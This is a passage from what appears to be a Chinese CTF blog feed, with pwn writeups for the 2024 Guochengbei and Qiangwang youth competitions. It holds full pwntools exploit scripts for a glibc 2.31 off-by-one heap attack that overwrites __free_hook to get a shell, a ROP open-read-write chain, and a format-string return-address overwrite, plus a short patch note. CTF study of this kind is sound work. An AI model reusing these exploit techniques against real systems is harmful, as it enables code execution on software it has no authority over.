class="comment">#rdi=libc_base+0x00000000000215bf</span></span><br><span class="line"><span class="comment">#rsi=libc_base+0x0000000000023eea</span></span><br><span class="line">rsi = libc_base+libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)).__next__()</span><br><span class="line"><span class="comment">#rdx=libc_base+0x0000000000001b96</span></span><br><span class="line"><span class="comment">#rdx_r12 = libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span></span><br><span class="line">rax = libc_base+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(<span class="string">&quot;ret&quot;</span>)).__next__()</span><br><span class="line"><span class="comment">#rax=libc_base+0x0000000000043ae8</span></span><br><span class="line"><span class="comment">#ret=libc_base+0x00000000000008aa</span></span><br><span class="line">syscall=libc_base+libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).__next__()</span><br><span class="line">jmp_rsp=libc_base+libc.search(asm(<span class="string">&quot;jmp rsp&quot;</span>)).__next__()</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">syscall=libc_base+libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).__next__()</span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">IO_stdout=libc_base+libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">environ=libc_base+libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">3</span>)*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(IO_stdout)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">stdout_attack=p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(environ)+p64(environ+<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,stdout_attack+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">stack=get_addr64()</span><br><span class="line">li(<span class="built_in">hex</span>(stack))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(stack-<span class="number">288</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">flag=heap_base+<span class="number">0x1360</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"><span class="comment">#edit(0,p64(rdi)+b&#x27;\n&#x27;)</span></span><br><span class="line">edit(<span class="number">0</span>,p64(rdx)+p64(<span class="number">0x100</span>)+p64(syscall)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">orw = p64(rdi) + p64(flag)  <span class="comment">#/flag的字符串位置，要改</span></span><br><span class="line">orw += p64(rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(rdx) + p64(<span class="number">0x50</span>)</span><br><span class="line">orw += p64(rsi)+p64(stack+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(rdx) + p64(<span class="number">0x50</span>)</span><br><span class="line">orw += p64(rsi)+p64(stack+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(write_addr)</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">2024国城杯</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2024qwb青少年</title>
    <link href="https://www.thir0th.xyz/posts/39ef564c.html"/>
    <id>https://www.thir0th.xyz/posts/39ef564c.html</id>
    <published>2025-04-20T06:38:35.000Z</published>
    <updated>2025-06-25T13:25:13.659Z</updated>
    
    <content type="html"><![CDATA[<h1>2024强网青少年</h1><h3 id="线上">线上</h3><h4 id="heap">heap</h4><p>2.31的of by one，add free,show free菜单函数</p><p>add和edit都有末尾置零，show直接被截断，没办法泄露出libc</p><p>这题的难点也就是泄露出libc</p><p>解题思路：</p><p>先free7个堆块，前6个进入tcachebin，第7个会进入unsortdbin，之后堆块切割，将一个大堆块分为小堆块，并且留一部分堆块在unsortdbin中，这样每个小堆块中都有libc地址，但会被\x00截断，修改小堆块的size，将申请的小堆块合并，并且可以修改在unsotrdbin中的prsize,size</p><p>这样可以show出libc地址</p><p>之后malloc会报错，提前布置好堆块打of by one attack攻击free_hook，获取shell</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1733840641114-5aca0de2-5c19-45e9-bb64-107c04b8a20e.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">rl(<span class="string">&quot;Choose an option: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;Enter the size of your story (in hex, between 0x28 and 0xb0):&quot;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(size))</span><br><span class="line">rl(<span class="string">&quot;characters): &quot;</span>)</span><br><span class="line">sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Choose an option: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">rl(<span class="string">&quot;Choose an option: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;Choose an option: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">sl(content)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):<span class="comment">#0-9</span></span><br><span class="line">add(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#0-6</span></span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p8(<span class="number">0x71</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x61</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">libc_base=get_addr64()-<span class="number">2018145</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">edit(1,b&#x27;\x00&#x27;*(0x28)+p64(0x31)+b&#x27;\x00&#x27;*(0x28)+p64(0x31))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">free(2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#edit(1,b&#x27;/bin/sh\x00&#x27;+p64(0)*4+p64(0x31)+p64(free_hook))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x48</span>)+p8(<span class="number">0xa1</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x51</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>,p64(system))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="线下awdp">线下awdp</h3><h4 id="smart-home">smart_home</h4><h5 id="攻击：">攻击：</h5><p>无限次fmt，字节限制为0x10</p><p>非栈上打指针跳转，攻击rbp+8，改为one_gadet，3退出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;51%9$p%11$p&#x27;</span></span><br><span class="line"></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">147587</span></span><br><span class="line">bug()</span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">240</span>-<span class="number">2</span></span><br><span class="line">li(<span class="built_in">hex</span>(stack+<span class="number">2</span>))</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span>-<span class="number">2</span></span><br><span class="line">li(<span class="built_in">hex</span>(one_gadget+<span class="number">2</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(one_gadget&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>))</span><br><span class="line">pause()</span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;51%&#x27;</span>+<span class="built_in">str</span>(stack&amp;<span class="number">0xffff</span>).encode() +<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">li(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line">pay3=<span class="string">b&#x27;51%&#x27;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>    </span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(pay3)</span><br><span class="line">stack=stack+<span class="number">2</span></span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line">pay4=<span class="string">b&#x27;51%&#x27;</span>+<span class="built_in">str</span>(stack&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>    </span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(pay4)</span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line">pay5=<span class="string">b&#x27;51%&#x27;</span>+<span class="built_in">str</span>(one_gadget&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>-<span class="number">2</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>    </span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(pay5)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h5 id="防御：">防御：</h5><p>找到fmt漏洞的汇编：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733838936488-143b2d22-5e9b-4ca5-8514-77f34e0961da.png" alt="">将call _printf改为call _puts：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733839189511-ac68f169-3b69-4569-a421-536f654eeb7f.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733839238746-a9ba6112-b362-4e15-bfe3-321784a08d2a.png" alt=""></p><h4 id="youth-memory-album">youth_memory_album</h4><h5 id="攻击：-2">攻击：</h5><p>蜀道山mini_hook的弱化版，基本同样的打法，攻击tcachebin的指针区</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 